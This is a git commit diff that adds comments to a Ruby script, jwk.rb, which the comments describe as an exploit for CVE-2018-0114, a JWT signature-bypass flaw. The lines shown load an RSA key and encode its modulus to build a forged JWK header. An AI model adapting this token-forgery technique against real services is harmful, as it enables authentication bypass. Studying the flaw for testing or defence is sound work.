3a957dc9f09debfeb0d56b657b60fcd87269b7ad
Deepak Kumar Giri <43544067+Dkgiri619@users.noreply.github.com>
2020-11-03 17:15:05 +0000

    Update jwk.rb

--- jwk.rb
+++ jwk.rb
@@ -1,8 +1,11 @@
+#CVE-2018-0114, it was very difficult to generate the token in python
+#It was the hardest till now what I have found, casue the exploit is very complex
+
 require 'openssl'
 require 'base64'
 require 'json'
 
-priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
+priv = OpenSSL::PKey::RSA.new File.read 'private.pem' # I had generated it previously from openssl
 
 pub = priv.public_key
 n= Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
